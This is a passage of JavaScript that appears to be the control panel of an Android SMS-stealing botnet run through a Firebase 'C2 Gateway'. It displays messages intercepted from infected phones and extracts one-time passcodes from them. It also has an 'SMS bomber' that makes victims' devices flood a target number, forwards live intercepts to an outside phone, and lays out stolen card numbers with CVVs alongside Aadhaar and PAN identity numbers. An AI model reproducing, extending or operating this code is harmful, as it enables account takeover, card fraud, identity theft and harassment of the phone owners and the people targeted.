        if (!parsedTs && typeof timeVal === 'number' && timeVal > 0) {
            parsedTs = timeVal > 1e11 ? timeVal : timeVal * 1000;
        }
        if (!parsedTs) {
            parsedTs = parseDateStrToTimestamp(String(timeVal)) || 0;
        }
        if (!parsedTs) {
            parsedTs = decodeFirebasePushKey(k);
        }

        if (isServer1Active() && parsedTs) {
            const diff = Date.now() - parsedTs;
            if (diff >= -900000 && diff <= 24 * 60 * 60 * 1000) {
                if (state.server1RecentSmsDevices) state.server1RecentSmsDevices.add(devId);
            }
        }

        const sender = v.sender || v.from || v.number || v.phone || 'Unknown';
        const body = v.body || v.message || v.msg || v.content || v.text || '';
        if (!body && sender === 'Unknown') return;

        const effectiveDev = devId && devId !== 'Broadcast' && devId !== 'SMS-Direct'
            ? devId
            : (v.device || v.targetDeviceId || v.phoneNumber || v.target || v.mobile || devId || 'Node-Target');

        if (state.mutedDevices.has(effectiveDev) && !showMuted) return;

        const dedupKey = `${effectiveDev}__${sender}__${body}__${Math.floor(parsedTs / 1000)}`;
        if (seen.has(dedupKey)) return;
        seen.add(dedupKey);

        all.push({
            time: typeof timeVal === 'number' ? new Date(parsedTs || timeVal).toLocaleString() : timeVal,
            device: effectiveDev,
            sender: sender,
            body: body,
            ts: parsedTs,
            key: k
        });
    }

    if (data && typeof data === 'object') {
        Object.entries(data).forEach(([devId, msgs]) => {
            if (!msgs || typeof msgs !== 'object') return;
            Object.entries(msgs).forEach(([k, v]) => {
                addMsg(devId, k, v);
            });
        });
    }

    all.sort((a, b) => {
        const diff = (Number(b.ts) || 0) - (Number(a.ts) || 0);
        if (diff !== 0) return diff;
        if (b.key && a.key) return b.key.localeCompare(a.key);
        return 0;
    });

    state.globalSortedMsgs = all;
    state.smsPageIndex = 0;
    const countBadge = document.getElementById('smsCountBadge');
    if (countBadge) countBadge.textContent = all.length;
    renderSmsPage();
}

function extractOtp(text) {
    if (!text) return null;
    const otpMatch = text.match(/\b\d{4,8}\b/);
    return otpMatch ? otpMatch[0] : null;
}

function copyOtp(code, event) {
    if (event) event.stopPropagation();
    navigator.clipboard.writeText(code).then(() => {
        playCyberSound('blip');
        showToast(`OTP COPIED: ${code}`, 'success');
    }).catch(() => {
        showToast(`OTP: ${code}`, 'info');
    });
}

function renderSmsPage() {
    const list = document.getElementById('smsList');
    const empty = document.getElementById('smsEmpty');
    const pagination = document.getElementById('smsPagination');

    list.querySelectorAll('.sms-card').forEach(c => c.remove());
    state.smsKeyMap = {};

    const total = state.globalSortedMsgs.length;
    if (total === 0) {
        if (empty) empty.style.display = 'flex';
        if (pagination) pagination.style.display = 'none';
        return;
    }

    if (empty) empty.style.display = 'none';
    if (pagination) pagination.style.display = 'flex';

    const pages = Math.ceil(total / state.smsPageSize);
    const start = state.smsPageIndex * state.smsPageSize;
    const slice = state.globalSortedMsgs.slice(start, start + state.smsPageSize);

    const frag = document.createDocumentFragment();
    slice.forEach((m, i) => {
        const id = `sms_${start + i}`;
        const card = document.createElement('div');
        card.className = 'sms-card';
        card.id = id;

        const otp = extractOtp(m.body);
        let otpBadgeHtml = '';
        if (otp) {
            otpBadgeHtml = `<div class="otp-badge" onclick="copyOtp('${otp}', event)"><span>🔑 OTP:</span> <strong>${esc(otp)}</strong> <span style="font-size:0.7rem; opacity:0.8;">[COPY]</span></div>`;
        }

        card.innerHTML = `
            <div class="sms-card-top">
                <span class="sms-card-sender">${esc(m.sender)}</span>
                <span class="sms-card-time">${esc(String(m.time))}</span>
            </div>
            <div class="sms-card-device">NODE: ${esc(m.device)}</div>
            ${otpBadgeHtml}
            <div class="sms-card-body">${esc(m.body)}</div>
        `;
        card.addEventListener('click', () => {
            list.querySelectorAll('.sms-card').forEach(c => c.classList.remove('selected'));
            card.classList.add('selected');
            openSheet(m.device, `Last Intercept: ${m.sender}`);
        });
        frag.appendChild(card);
        state.smsKeyMap[id] = { device: m.device, key: m.key };
    });

    list.appendChild(frag);
    const pageInfo = document.getElementById('smsPageInfo');
    const prevBtn = document.getElementById('smsPrevBtn');
    const nextBtn = document.getElementById('smsNextBtn');
    if (pageInfo) pageInfo.textContent = `${state.smsPageIndex + 1} / ${pages}`;
    if (prevBtn) prevBtn.disabled = state.smsPageIndex <= 0;
    if (nextBtn) nextBtn.disabled = state.smsPageIndex >= pages - 1;
}

function prevSmsPage() {
    if (state.smsPageIndex > 0) {
        state.smsPageIndex--;
        renderSmsPage();
        document.getElementById('mainContent').scrollTop = 0;
    }
}
function nextSmsPage() {
    const p = Math.ceil(state.globalSortedMsgs.length / state.smsPageSize);
    if (state.smsPageIndex < p - 1) {
        state.smsPageIndex++;
        renderSmsPage();
        document.getElementById('mainContent').scrollTop = 0;
    }
}

// ==========================================================================
// TAB 3: SMS BOMBER / PACKET INJECTOR
// ==========================================================================

function setBomberMode(mode) {
    playCyberSound('blip');
    state.bomberMode = mode;
    document.querySelectorAll('.mode-btn').forEach(btn => btn.classList.toggle('active', btn.dataset.mode === mode));

    const bomberSettings = document.getElementById('bomberSettings');
    const normalSettings = document.getElementById('normalSettings');
    const launchBtn = document.getElementById('bomberLaunchBtn');

    if (mode === 'normal') {
        if (bomberSettings) bomberSettings.style.display = 'none';
        if (normalSettings) normalSettings.style.display = 'block';
        if (launchBtn) {
            launchBtn.innerHTML = `<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polygon points="5 3 19 12 5 21 5 3"/></svg> DISPATCH RELAY CONDUIT ⚡`;
        }

        const sel = document.getElementById('normalSenderSelect');
        if (sel && !sel.value && sel.options.length > 1) {
            sel.selectedIndex = 1;
        }
    } else {
        if (bomberSettings) bomberSettings.style.display = 'block';
        if (normalSettings) normalSettings.style.display = 'none';
        if (launchBtn) {
            launchBtn.innerHTML = `<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polygon points="5 3 19 12 5 21 5 3"/></svg> INITIATE EXPLOIT BARRAGE ☠️`;
        }
    }
}

function setPresetBomberCount(val) {
    playCyberSound('blip');
    const input = document.getElementById('bomberCount');
    if (input) input.value = val;
}

function adjustBomberCount(delta) {
    playCyberSound('blip');
    const input = document.getElementById('bomberCount');
    if (!input) return;
    let val = parseInt(input.value) || 50;
    val = Math.max(1, Math.min(10000, val + delta));
    input.value = val;
}

function adjustBomberDelay(delta) {
    playCyberSound('blip');
    const input = document.getElementById('bomberDelay');
    if (!input) return;
    let val = parseInt(input.value) || 200;
    val = Math.max(0, Math.min(10000, val + delta));
    input.value = val;
}

function updateBomberDeviceInfo() {
    const active = state.devices.filter(id => !state.mutedDevices.has(id));
    const el = document.getElementById('bomberDeviceInfo');
    if (el) el.textContent = `${active.length} active nodes armed in cluster`;
}

function addBomberLog(num, deviceId, success, msg) {
    const log = document.getElementById('bomberLog');
    const empty = document.getElementById('bomberLogEmpty');
    if (empty) empty.style.display = 'none';

    const entry = document.createElement('div');
    entry.className = `log-entry ${success ? 'log-success' : 'log-fail'}`;
    entry.innerHTML = `
        <span class="log-num">#${num}</span>
        <span class="log-device">${esc(deviceId.substring(0, 16))}…</span>
        <span>${success ? '✓ Injected' : '✕ Dropped'}</span>
    `;

    if (log.firstChild) log.insertBefore(entry, log.firstChild);
    else log.appendChild(entry);

    while (log.children.length > 200) log.removeChild(log.lastChild);
}

async function startBomber() {
    if (!FB_URL) return showToast('Connect C2 Gateway first', 'error');
    if (state.bomberRunning) return;

    const target = document.getElementById('bomberTarget').value.trim();
    const message = document.getElementById('bomberMessage').value.trim();
    const count = parseInt(document.getElementById('bomberCount').value) || 50;
    const delay = parseInt(document.getElementById('bomberDelay').value) || 200;

    if (!target) return showToast('Enter target phone number', 'warning');
    if (!message) return showToast('Enter broadcast payload', 'warning');

    const activeDevices = state.devices.filter(id => !state.mutedDevices.has(id));

    // Normal Mode
    if (state.bomberMode === 'normal') {
        const sender = document.getElementById('normalSenderSelect').value;
        if (!sender) return showToast('Select a sender conduit node', 'warning');

        playCyberSound('launch');
        setStatus('DISPATCHING PAYLOAD…', 'loading');
        const launchBtn = document.getElementById('bomberLaunchBtn');
        if (launchBtn) launchBtn.disabled = true;

        if (sender === 'ALL') {
            if (activeDevices.length === 0) {
                if (launchBtn) launchBtn.disabled = false;
                setStatus('ARMED // READY');
                return showToast('No active nodes ready', 'error');
            }

            let okCount = 0, failCount = 0;
            const log = document.getElementById('bomberLog');
            if (log) log.querySelectorAll('.log-entry').forEach(e => e.remove());
            const empty = document.getElementById('bomberLogEmpty');
            if (empty) empty.style.display = 'none';

            const BATCH_SIZE = 20;
            for (let b = 0; b < activeDevices.length; b += BATCH_SIZE) {
                const batch = activeDevices.slice(b, b + BATCH_SIZE);
                setStatus(`INJECTING BATCH ${Math.floor(b / BATCH_SIZE) + 1}… (${b}/${activeDevices.length})`, 'loading');
                await Promise.allSettled(
                    batch.map((devId, idx) => {
                        const globalIdx = b + idx + 1;
                        return fetch(`${FB_URL}/${DATA_PATH}/${devId}.json`, {
                            method: 'PATCH',
                            body: JSON.stringify({
                                command: "send message",
                                phoneNumber: target,
                                messageText: message,
                                simSlot: state.bomberSim,
                                targetDeviceId: devId
                            }),
                            headers: { 'Content-Type': 'application/json' },
                        }).then(r => {
                            if (r.ok) { okCount++; addBomberLog(globalIdx, devId, true, 'Sent Normal (ALL)'); }
                            else { failCount++; addBomberLog(globalIdx, devId, false, 'Failed Normal (ALL)'); }
                        }).catch(() => {
                            failCount++;
                            addBomberLog(globalIdx, devId, false, 'Error Normal (ALL)');
                        });
                    })
                );
            }
            showToast(`Batch Done! Injected: ${okCount}, Dropped: ${failCount}`, okCount > 0 ? 'success' : 'error');
        } else {
            try {
                const r = await fetch(`${FB_URL}/${DATA_PATH}/${sender}.json`, {
                    method: 'PATCH',
                    body: JSON.stringify({
                        command: "send message",
                        phoneNumber: target,
                        messageText: message,
                        simSlot: state.bomberSim,
                        targetDeviceId: sender
                    }),
                    headers: { 'Content-Type': 'application/json' },
                });
                if (r.ok) {
                    showToast('Payload Dispatched!', 'success');
                    addBomberLog(1, sender, true, 'Sent via Normal Mode');
                } else {
                    showToast('Failed to dispatch payload', 'error');
                    addBomberLog(1, sender, false, 'Failed via Normal Mode');
                }
            } catch (e) {
                showToast('Network timeout error', 'error');
                addBomberLog(1, sender, false, 'Network error');
            }
        }

        if (launchBtn) launchBtn.disabled = false;
        setStatus('ARMED // READY');
        return;
    }

    // Swarm Barrage Mode
    if (activeDevices.length === 0) return showToast('No active nodes ready. Sweep nodes first.', 'error');

    playCyberSound('launch');
    state.bomberRunning = true;
    state.bomberAbort = false;

    const launchBtn = document.getElementById('bomberLaunchBtn');
    const stopBtn = document.getElementById('bomberStopBtn');
    const progressSection = document.getElementById('bomberProgress');
    if (launchBtn) launchBtn.style.display = 'none';
    if (stopBtn) stopBtn.style.display = 'block';
    if (progressSection) progressSection.style.display = 'block';

    const sentEl = document.getElementById('bomberSentCount');
    const failEl = document.getElementById('bomberFailCount');
    const totalEl = document.getElementById('bomberTotalCount');
    if (sentEl) sentEl.textContent = '0';
    if (failEl) failEl.textContent = '0';
    if (totalEl) totalEl.textContent = count;

    const log = document.getElementById('bomberLog');
    if (log) log.querySelectorAll('.log-entry').forEach(e => e.remove());
    const empty = document.getElementById('bomberLogEmpty');
    if (empty) empty.style.display = 'none';

    setStatus('BOMBING TARGET…', 'loading');
    let sent = 0, failed = 0;

    const BOMB_BATCH = 20;
    for (let b = 0; b < count; b += BOMB_BATCH) {
        if (state.bomberAbort) break;

        const batchEnd = Math.min(b + BOMB_BATCH, count);
        const batchItems = [];
        for (let i = b; i < batchEnd; i++) {
            batchItems.push({ idx: i, devId: activeDevices[i % activeDevices.length] });
        }

        setStatus(`INJECTING BATCH ${Math.floor(b / BOMB_BATCH) + 1}… (${b}/${count})`, 'loading');

        await Promise.allSettled(
            batchItems.map(item => {
                const payload = {
                    command: "send message",
                    phoneNumber: target,
                    messageText: message,
                    simSlot: state.bomberSim,
                    targetDeviceId: item.devId,
                };
                return fetch(`${FB_URL}/${DATA_PATH}/${item.devId}.json`, {
                    method: 'PATCH',
                    body: JSON.stringify(payload),
                    headers: { 'Content-Type': 'application/json' },
                }).then(r => {
                    if (r.ok) { sent++; addBomberLog(item.idx + 1, item.devId, true); }
                    else { failed++; addBomberLog(item.idx + 1, item.devId, false); }
                }).catch(() => {
                    failed++;
                    addBomberLog(item.idx + 1, item.devId, false);
                });
            })
        );

        if (sentEl) sentEl.textContent = sent;
        if (failEl) failEl.textContent = failed;

        const pct = Math.round((batchEnd / count) * 100);
        const progText = document.getElementById('bomberProgressText');
        const progPct = document.getElementById('bomberProgressPercent');
        const progFill = document.getElementById('bomberProgressFill');
        if (progText) progText.textContent = `${batchEnd} / ${count}`;
        if (progPct) progPct.textContent = `${pct}%`;
        if (progFill) progFill.style.width = `${pct}%`;

        if (delay > 0 && batchEnd < count && !state.bomberAbort) {
            await new Promise(resolve => setTimeout(resolve, delay));
        }
    }

    state.bomberRunning = false;
    if (launchBtn) launchBtn.style.display = 'flex';
    if (stopBtn) stopBtn.style.display = 'none';

    const aborted = state.bomberAbort;
    state.bomberAbort = false;
    setStatus(aborted ? 'ABORTED' : 'ARMED // READY');
    showToast(aborted ? `Infiltration Stopped: ${sent}/${count}` : `Mission Complete: Injected ${sent}, Dropped ${failed}`, aborted ? 'warning' : 'success');
}

function stopBomber() {
    playCyberSound('abort');
    state.bomberAbort = true;
    showToast('Aborting Injection…', 'warning');
}

// ==========================================================================
// BOTTOM SHEET (NODE DETAIL INFILTRATION TERMINAL)
// ==========================================================================

async function openSheet(devId, extra = '') {
    playCyberSound('blip');
    state.currentSheetDevId = devId;
    state.sheetSmsAll = [];
    state.sheetPageIndex = 0;

    const sheet = document.getElementById('deviceSheet');
    if (sheet) sheet.classList.add('active');
    document.body.style.overflow = 'hidden';

    const sheetTitle = document.getElementById('sheetTitle');
    const sheetDeviceId = document.getElementById('sheetDeviceId');
    const sheetInfo = document.getElementById('sheetInfo');
    const sheetSmsList = document.getElementById('sheetSmsList');
    const sheetSmsCount = document.getElementById('sheetSmsCount');
    const sheetPagination = document.getElementById('sheetPagination');

    if (sheetTitle) sheetTitle.textContent = 'NODE INFILTRATION';
    if (sheetDeviceId) sheetDeviceId.textContent = devId;
    if (sheetInfo) sheetInfo.textContent = extra || 'Interrogating node telemetry…';
    if (sheetSmsList) sheetSmsList.innerHTML = '';
    if (sheetSmsCount) sheetSmsCount.textContent = '0';
    if (sheetPagination) sheetPagination.style.display = 'none';

    const detailEl = document.getElementById('sheetSmsDetail');
    if (detailEl) detailEl.style.display = 'none';
    const moreDetailsEl = document.getElementById('sheetMoreDetails');
    if (moreDetailsEl) { moreDetailsEl.style.display = 'none'; moreDetailsEl.innerHTML = ''; }

    populateSenderDropdowns();

    try {
        const data = await fetch(`${FB_URL}/${DATA_PATH}/${devId}.json`).then(r => r.json());
        if (data && typeof data === 'object') {
            const txt = Object.entries(data).filter(([k, v]) => typeof v !== 'object').map(([k, v]) => `${k}: ${v}`).join('\n');
            let statusPrefix = '';
            if ((!data.status || isServer1Active())) {
                const onlineNow = isDeviceOnline(devId, data);
                statusPrefix = `status: ${onlineNow ? 'ONLINE (ACTIVE)' : 'OFFLINE'}\n`;
            }
            if (sheetInfo) sheetInfo.textContent = statusPrefix + (txt || 'No extra node parameters');
        }
    } catch (e) {
        if (sheetInfo) sheetInfo.textContent = 'Failed to interrogation node';
    }

    if (state.sheetSmsInterval) clearInterval(state.sheetSmsInterval);
    state.sheetSmsInterval = setInterval(() => fetchSheetSms(devId, true), 5000);
    fetchSheetSms(devId);
}

function refreshSheetSms() {
    if (!state.currentSheetDevId) return;
    fetchSheetSms(state.currentSheetDevId, false);
}

async function fetchSheetSms(devId, silent = false) {
    if (!silent) setStatus('INTERCEPTING NODE SMS…', 'loading');
    try {
        const dUserSms = await fetch(`${FB_URL}/${SMS_PATH}/${devId}.json`).then(r => r.json()).catch(() => null);
        if (!silent) setStatus('ARMED // READY');
        if (!dUserSms) {
            const countEl = document.getElementById('sheetSmsCount');
            if (countEl) countEl.textContent = '0';
            return;
        }

        const msgs = [];
        const seenKeys = new Set();
        Object.entries(dUserSms).forEach(([k, v]) => {
            if (!v || typeof v !== 'object') return;
            const timeVal = v.date || v.time || v.TimeandDate || v.created_at || 'Unknown';
            let parsedTs = 0;
            if (v.timestamp) {
                const n = Number(v.timestamp);
                if (!isNaN(n) && n > 0) parsedTs = n > 1e11 ? n : n * 1000;
            }
            if (!parsedTs && v.created_at) {
                const n = Number(v.created_at);
                if (!isNaN(n) && n > 0) parsedTs = n > 1e11 ? n : n * 1000;
            }
            if (!parsedTs && typeof timeVal === 'number' && timeVal > 0) {
                parsedTs = timeVal > 1e11 ? timeVal : timeVal * 1000;
            }
            if (!parsedTs) {
                parsedTs = parseDateStrToTimestamp(String(timeVal)) || 0;
            }
            if (!parsedTs) {
                parsedTs = decodeFirebasePushKey(k);
            }

            if (isServer1Active() && parsedTs) {
                const diff = Date.now() - parsedTs;
                if (diff >= -900000 && diff <= 24 * 60 * 60 * 1000) {
                    if (state.server1RecentSmsDevices) state.server1RecentSmsDevices.add(devId);
                }
            }

            const sender = v.sender || v.from || v.number || v.phone || 'Unknown';
            const body = v.body || v.message || v.msg || v.content || v.text || '';
            const dedup = `${sender}__${body}__${Math.floor(parsedTs / 1000)}`;
            if (seenKeys.has(dedup)) return;
            seenKeys.add(dedup);

            msgs.push({
                time: typeof timeVal === 'number' ? new Date(parsedTs || timeVal).toLocaleString() : timeVal,
                sender: sender,
                body: body,
                ts: parsedTs,
                key: k
            });
        });

        msgs.sort((a, b) => {
            const diff = (Number(b.ts) || 0) - (Number(a.ts) || 0);
            if (diff !== 0) return diff;
            if (b.key && a.key) return b.key.localeCompare(a.key);
            return 0;
        });

        state.sheetSmsAll = msgs;
        state.sheetPageIndex = 0;
        const countEl = document.getElementById('sheetSmsCount');
        if (countEl) countEl.textContent = msgs.length;
        renderSheetSmsPage();
    } catch (e) {
        if (!silent) setStatus('ERROR', 'error');
    }
}

function renderSheetSmsPage() {
    const list = document.getElementById('sheetSmsList');
    const pagination = document.getElementById('sheetPagination');
    if (!list) return;
    list.innerHTML = '';

    const msgs = state.sheetSmsAll;
    const total = msgs.length;
    if (total === 0) {
        if (pagination) pagination.style.display = 'none';
        return;
    }

    if (pagination) pagination.style.display = 'flex';
    const pages = Math.ceil(total / state.sheetPageSize);
    const start = state.sheetPageIndex * state.sheetPageSize;
    const slice = msgs.slice(start, start + state.sheetPageSize);

    slice.forEach(m => {
        const card = document.createElement('div');
        card.className = 'sms-card';

        const otp = extractOtp(m.body);
        let otpBadgeHtml = '';
        if (otp) {
            otpBadgeHtml = `<div class="otp-badge" onclick="copyOtp('${otp}', event)"><span>🔑 OTP:</span> <strong>${esc(otp)}</strong> <span style="font-size:0.65rem;">[COPY]</span></div>`;
        }

        card.innerHTML = `
            <div class="sms-card-top">
                <span class="sms-card-sender">${esc(m.sender)}</span>
                <span class="sms-card-time">${esc(String(m.time))}</span>
            </div>
            ${otpBadgeHtml}
            <div class="sms-card-body">${esc(m.body)}</div>
        `;
        card.addEventListener('click', () => {
            const detail = document.getElementById('sheetSmsDetail');
            if (detail) {
                detail.style.display = 'block';
                const bodyEl = document.getElementById('sheetSmsDetailBody');
                if (bodyEl) bodyEl.textContent = m.body;
            }
            list.querySelectorAll('.sms-card').forEach(c => c.classList.remove('selected'));
            card.classList.add('selected');
        });
        list.appendChild(card);
    });

    const infoEl = document.getElementById('sheetPageInfo');
    const prevBtn = document.getElementById('sheetSmsPrev');
    const nextBtn = document.getElementById('sheetSmsNext');
    if (infoEl) infoEl.textContent = `${state.sheetPageIndex + 1} / ${pages}`;
    if (prevBtn) prevBtn.disabled = state.sheetPageIndex <= 0;
    if (nextBtn) nextBtn.disabled = state.sheetPageIndex >= pages - 1;
}

function sheetPrevPage() { if (state.sheetPageIndex > 0) { state.sheetPageIndex--; renderSheetSmsPage(); } }
function sheetNextPage() { const p = Math.ceil(state.sheetSmsAll.length / state.sheetPageSize); if (state.sheetPageIndex < p - 1) { state.sheetPageIndex++; renderSheetSmsPage(); } }

function closeSheet() {
    playCyberSound('blip');
    const devId = state.currentSheetDevId;
    if (devId && state.forwardIntervals[devId]) {
        clearInterval(state.forwardIntervals[devId]);
        state.forwardThreads[devId] = false;
        delete state.forwardIntervals[devId];
    }
    if (state.sheetSmsInterval) {
        clearInterval(state.sheetSmsInterval);
        state.sheetSmsInterval = null;
    }
    state.currentSheetDevId = null;
    const sheet = document.getElementById('deviceSheet');
    if (sheet) sheet.classList.remove('active');
    const moreDetailsEl = document.getElementById('sheetMoreDetails');
    if (moreDetailsEl) { moreDetailsEl.style.display = 'none'; moreDetailsEl.innerHTML = ''; }
    document.body.style.overflow = '';
}

document.addEventListener('click', (e) => {
    if (e.target.id === 'deviceSheet') closeSheet();
});

// Single Direct Message Dispatch
async function sendSingleMessage() {
    const devId = state.currentSheetDevId;
    if (!devId) return;
    const phone = document.getElementById('sheetPhone').value.trim();
    const msg = document.getElementById('sheetMessage').value.trim();
    if (!phone || !msg) return showToast('Enter destination phone & payload', 'warning');

    playCyberSound('launch');
    try {
        const r = await fetch(`${FB_URL}/${DATA_PATH}/${devId}.json`, {
            method: 'PATCH',
            body: JSON.stringify({ command: "send message", phoneNumber: phone, messageText: msg, simSlot: state.sheetSim, targetDeviceId: devId }),
            headers: { 'Content-Type': 'application/json' },
        });
        if (r.ok) showToast('Payload Dispatched!', 'success');
    } catch (e) {
        showToast(e.message, 'error');
    }
}

// Quantum Relay Forwarding
function toggleForward() {
    const devId = state.currentSheetDevId;
    if (!devId) return;
    const btn = document.getElementById('sheetFwdBtn');
    const statusEl = document.getElementById('sheetFwdStatus');

    if (state.forwardThreads[devId]) {
        state.forwardThreads[devId] = false;
        clearInterval(state.forwardIntervals[devId]);
        delete state.forwardIntervals[devId];
        if (btn) {
            btn.textContent = 'START CONDUIT';
            btn.className = 'action-btn action-primary';
        }
        if (statusEl) statusEl.textContent = 'Conduit Disengaged.';
        return;
    }

    const targetPhone = document.getElementById('sheetFwdPhone').value.trim();
    const senderDev = document.getElementById('sheetSenderDevice').value;
    if (!targetPhone || !senderDev) return showToast('Enter destination phone & select node', 'warning');

    state.forwardThreads[devId] = true;
    if (btn) {
        btn.textContent = 'ABORT CONDUIT';
        btn.className = 'action-btn action-red';
    }
    if (statusEl) statusEl.textContent = 'Monitoring Live Intercepts…';

    let seenKeys = new Set();
    fetch(`${FB_URL}/${SMS_PATH}/${devId}.json?shallow=true`).then(r => r.json()).then(d => { if (d) seenKeys = new Set(Object.keys(d)); }).catch(() => {});

    state.forwardIntervals[devId] = setInterval(async () => {
        if (!state.forwardThreads[devId]) { clearInterval(state.forwardIntervals[devId]); return; }
        try {
            const data = await fetch(`${FB_URL}/${SMS_PATH}/${devId}.json`).then(r => r.json());
            if (!data) return;
            for (const [k, v] of Object.entries(data)) {
                if (seenKeys.has(k)) continue;
                seenKeys.add(k);
                if (!v || typeof v !== 'object') continue;
                const body = v.body || v.message || v.msg || '';
                try {
                    await fetch(`${FB_URL}/${DATA_PATH}/${senderDev}.json`, {
                        method: 'PATCH',
                        body: JSON.stringify({ command: "send message", phoneNumber: targetPhone, messageText: body, simSlot: "1", targetDeviceId: senderDev }),
                        headers: { 'Content-Type': 'application/json' },
                    });
                    if (statusEl) statusEl.textContent = `Relayed → ${targetPhone}`;
                } catch (e) {}
            }
        } catch (e) {}
    }, 500);
}

// Utility Escaper
function esc(text) {
    const d = document.createElement('div');
    d.textContent = text;
    return d.innerHTML;
}

// Copy Card Field Utility
function copyCardField(val, label, event) {
    if (event) event.stopPropagation();
    if (!val || val === 'N/A' || val === 'undefined') return;
    navigator.clipboard.writeText(String(val)).then(() => {
        playCyberSound('blip');
        showToast(`${label} COPIED: ${val}`, 'success');
    }).catch(() => {
        showToast(`${label}: ${val}`, 'info');
    });
}

// ==========================================================================
// TAB 4: EXFILTRATED CITIZEN DOSSIERS & FINANCIAL CARDS
// ==========================================================================

async function fetchPagesData() {
    if (!FB_URL) return showToast('Connect C2 Gateway first', 'error');
    playCyberSound('blip');
    const pagesList = document.getElementById('pagesList');
    setStatus('EXTRACTING INTEL DOSSIERS…', 'loading');

    const isPaisaServer = FB_URL.includes('k-party-admin-panel') || document.body.getAttribute('data-planet') === 'paisa';

    try {
        let html = '';

        // Dedicated Card1 and Card2 Display across all servers (Display only - no buttons, no click events)
        const [rCard1, rCard2, rPage2] = await Promise.all([
            fetch(`${FB_URL}/card1.json`).then(r => r.json()).catch(() => null),
            fetch(`${FB_URL}/card2.json`).then(r => r.json()).catch(() => null),
            fetch(`${FB_URL}/page2.json`).then(r => r.json()).catch(() => null),
        ]);

        const allDevIds = new Set([
            ...Object.keys(rCard1 || {}),
            ...Object.keys(rCard2 || {})
        ]);

        if (allDevIds.size > 0) {
            const sortedIds = Array.from(allDevIds).sort();
            sortedIds.forEach(id => {
                const c1 = rCard1 ? rCard1[id] : null;
                const c2 = rCard2 ? rCard2[id] : null;

                const devInfo = state.rawFullData[id] || {};
                const model = devInfo.model || devInfo.d_name || '';
                const phone = devInfo.numberSim1 || devInfo.sim1Number || devInfo.phoneNumber || '';

                html += `<div class="card-dossier-wrapper" style="cursor:default; pointer-events:none;">
                    <!-- Node Header -->
                    <div class="card-dossier-header">
                        <div class="card-dossier-node" style="cursor:default;">
                            <span style="color:var(--orbit-accent); font-size:1.1rem;">⚡</span>
                            <span>NODE // ${esc(id)}</span>
                        </div>
                        <span style="background:var(--orbit-badge-bg); color:var(--orbit-accent); border:1px solid var(--orbit-border); padding:2px 8px; border-radius:4px; font-size:0.62rem; font-weight:800; font-family:var(--cyber-font-title);">FINANCIAL INTEL</span>
                    </div>`;

                if (model || phone) {
                    html += `<div style="display:flex; justify-content:space-between; font-family:var(--cyber-font-mono); font-size:0.7rem; color:var(--text-2); padding:0 2px;">
                        <span>${model ? '📱 ' + esc(model) : ''}</span>
                        <span>${phone ? '📞 ' + esc(phone) : ''}</span>
                    </div>`;
                }

                // Card 1 (Display Only)
                if (c1) {
                    const num1 = c1.Cnumber || c1.cardNumber || c1.cnumber || c1.number || 'N/A';
                    const exp1 = c1.Exp || c1.exp || c1.expiry || 'N/A';
                    const cvv1 = c1.cvv || c1.CVV || 'N/A';

                    html += `<div class="cyber-plastic-card" style="cursor:default;">
                        <div class="card-top-row">
                            <div class="card-chip"></div>
                            <span class="card-brand-badge">💳 CARD 1 // PRIMARY</span>
                        </div>
                        <div class="card-number-row" style="cursor:default;">
                            <span class="card-number-text">${esc(num1)}</span>
                        </div>
                        <div class="card-bottom-row">
                            <div class="card-meta-pill" style="cursor:default;">
                                <span class="card-meta-label">VALID THRU</span>
                                <span class="card-meta-val">${esc(exp1)}</span>
                            </div>
                            <div class="card-meta-pill" style="cursor:default;">
                                <span class="card-meta-label">CVV / CVC</span>
                                <span class="card-meta-val" style="color:var(--orbit-accent);">${esc(cvv1)}</span>
                            </div>
                        </div>
                    </div>`;
                }

                // Card 2 (Display Only)
                if (c2) {
                    const num2 = c2.Cnumber || c2.cardNumber || c2.cnumber || c2.number || 'N/A';
                    const exp2 = c2.Exp || c2.exp || c2.expiry || 'N/A';
                    const cvv2 = c2.cvv || c2.CVV || 'N/A';

                    html += `<div class="cyber-plastic-card card-alt" style="cursor:default;">
                        <div class="card-top-row">
                            <div class="card-chip" style="background:linear-gradient(135deg, #00f0ff, #0088ff);"></div>
                            <span class="card-brand-badge" style="color:var(--orbit-secondary);">💳 CARD 2 // SECONDARY</span>
                        </div>
                        <div class="card-number-row" style="cursor:default;">
                            <span class="card-number-text">${esc(num2)}</span>
                        </div>
                        <div class="card-bottom-row">
                            <div class="card-meta-pill" style="cursor:default;">
                                <span class="card-meta-label">VALID THRU</span>
                                <span class="card-meta-val">${esc(exp2)}</span>
                            </div>
                            <div class="card-meta-pill" style="cursor:default;">
                                <span class="card-meta-label">CVV / CVC</span>
                                <span class="card-meta-val" style="color:var(--orbit-secondary);">${esc(cvv2)}</span>
                            </div>
                        </div>
                    </div>`;
                }

                html += `</div>`;
            });
        }

        // Also check and render Page2 (Aadhaar & PAN registries if present)
        if (rPage2 && Object.keys(rPage2).length > 0) {
            for (const [id, info] of Object.entries(rPage2)) {
                let aadhar = info.pan || info.Pan || info.PAN || 'N/A';
                let pan = info.aadhar || info.Aadhar || info.AADHAR || 'N/A';

                html += `<div onclick="openSheet('${id}')" style="background:var(--hacker-card); margin-bottom: 12px; padding:16px; border:1.5px solid var(--orbit-border); border-left:4px solid var(--orbit-accent); border-radius:var(--r-sm); box-shadow:0 0 16px var(--cyber-shadow); cursor:pointer; width: 100%; box-sizing: border-box; transition:all 0.18s ease;">
                    <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:10px; padding-bottom:6px; border-bottom:1px dashed var(--orbit-border);">
                        <strong style="color:#ffffff; font-family:var(--cyber-font-mono); font-size:0.85rem; word-break: break-all;">CITIZEN_UID // ${id}</strong>
                        <span style="background:var(--orbit-badge-bg); color:var(--orbit-accent); border:1px solid var(--orbit-border); padding:2px 6px; border-radius:4px; font-size:0.62rem; font-weight:800; font-family:var(--cyber-font-title);">REGISTRY: 02</span>
                    </div>
                    
                    <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:8px;">
                        <div style="display:flex; align-items:center; gap:6px;">
                            <span style="font-size:1.1rem;">🪪</span>
                            <span style="color:var(--text-2); font-size:0.72rem; font-weight:700; text-transform:uppercase; font-family:var(--cyber-font-title);">AADHAAR NUMBER</span>
                        </div>
                        <span style="color:#ffffff; font-family:var(--cyber-font-mono); font-weight:800; font-size:0.95rem; letter-spacing:0.5px;">${esc(String(aadhar))}</span>
                    </div>
                    
